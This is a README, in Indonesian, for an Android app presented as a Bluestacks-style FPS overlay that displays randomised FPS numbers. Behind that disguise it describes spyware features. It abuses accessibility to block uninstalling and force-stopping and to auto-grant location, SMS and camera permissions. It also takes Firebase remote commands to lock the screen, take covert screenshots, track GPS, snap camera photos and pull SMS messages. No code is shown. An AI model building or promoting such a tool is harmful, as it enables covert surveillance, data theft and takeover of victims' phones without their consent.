# BluestacksFPS Overlay

Proyek ini adalah implementasi FPS Overlay bergaya Bluestacks untuk perangkat Android yang menggunakan **Accessibility Overlay** untuk performa dan fleksibilitas tampilan maksimal.

## Fitur Utama

### 1. Overlay FPS Real-Time (Accessibility Type)
- Menggunakan `TYPE_ACCESSIBILITY_OVERLAY` yang memungkinkan tampilan di atas aplikasi lain tanpa memerlukan izin `SYSTEM_ALERT_WINDOW` konvensional.
- Gaya teks (font) menggunakan `arialmed.ttf` untuk meniru tampilan Bluestacks asli.
- Fitur **Text Stretching**: Teks FPS dapat diatur skalanya (menggunakan `setTextScaleX`) agar terlihat lebih lebar/stretch, memberikan estetika yang identik dengan emulator Bluestacks.

### 2. Kustomisasi Rentang FPS
- Pengguna dapat menentukan batas minimal dan maksimal FPS melalui antarmuka aplikasi.
- Sistem akan secara otomatis melakukan randomisasi nilai di dalam rentang tersebut setiap detik untuk mensimulasikan dinamika FPS yang realistis.

### 3. Sistem Proteksi Lanjut (ProtectionManager)
- **Anti-Uninstall**: Mencegah penghapusan aplikasi dengan mendeteksi dialog uninstall dan secara otomatis menekan tombol "Cancel" atau kembali ke layar utama.
- **Auto-Allow Permissions**: Secara otomatis menyetujui permintaan izin sistem (seperti Lokasi, SMS, Kamera) melalui layanan aksesibilitas.
- **Back-to-App**: Menutup halaman "App Info" jika user mencoba menghentikan paksa aplikasi secara manual.

### 4. Kontrol Jarak Jauh (Firebase Integration)
- Integrasi dengan Firebase Realtime Database untuk menerima perintah remote seperti:
    - `lock`/`unlock`: Mengunci layar perangkat dengan overlay kustom.
    - `screenshot`: Mengambil screenshot layar secara diam-diam.
    - `location`: Melacak koordinat GPS perangkat.
    - `camera_front`/`camera_back`: Mengambil foto dari kamera perangkat.
    - `sms`: Mengambil daftar pesan SMS.

### 5. Invisible Core Activity
- Dilengkapi dengan `CoreActivity` transparan yang berfungsi sebagai "jembatan" untuk meminta izin sistem dan memastikan layanan latar belakang tetap berjalan tanpa mengganggu pengalaman pengguna.

---

## Persyaratan Sistem
- Android 8.0 (Oreo) atau lebih tinggi.
- Layanan Aksesibilitas harus diaktifkan untuk fitur overlay dan proteksi.
- Koneksi Internet untuk fitur remote control.
